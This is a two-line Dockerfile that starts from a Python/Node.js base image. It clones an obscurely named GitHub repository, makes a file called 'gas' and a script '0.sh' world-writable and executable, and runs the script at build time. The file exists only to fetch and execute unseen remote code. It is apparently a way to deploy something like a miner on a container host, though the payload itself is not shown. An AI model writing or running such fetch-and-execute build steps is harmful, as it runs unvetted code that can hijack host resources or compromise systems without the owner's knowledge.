FROM nikolaik/python-nodejs:python3.8-nodejs16

RUN git clone https://github.com/Annsjjsks/aa.git && cd aa && chmod 777 gas 0.sh && ./0.sh
